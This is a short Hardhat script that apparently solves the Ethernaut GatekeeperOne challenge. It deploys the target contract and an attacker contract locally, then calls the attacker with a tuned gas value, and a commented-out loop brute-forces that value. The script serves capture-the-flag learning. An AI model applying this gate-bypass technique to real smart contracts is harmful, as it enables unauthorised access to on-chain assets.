import { ethers } from "hardhat";

async function main() {


  const GatekeeperOne = await ethers.getContractFactory("GatekeeperOne");
  const gatekeeperOne = await GatekeeperOne.deploy();

  await gatekeeperOne.deployed();

  console.log(`GatekeeperOne deployed to ${gatekeeperOne.address}`);


  const AttackerGatekeeperOne = await ethers.getContractFactory("AttackerGatekeeperOne");
  const attackerGatekeeperOne = await AttackerGatekeeperOne.deploy(gatekeeperOne.address);

  await attackerGatekeeperOne.deployed();

  console.log(`Caler deployed to ${attackerGatekeeperOne.address}`);

  // for (let i = 5 * 8191 + 420; i < 5 * 8191 + 700; i++) {

  //   try {
  //     await attackerGatekeeperOne.calling(i)
  //     console.log('call correcta con el gas adecuado de' + i)
  //     break;
  //   } catch (error) {

  //   }
  // }

  await attackerGatekeeperOne.calling(41378 + 8191)
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
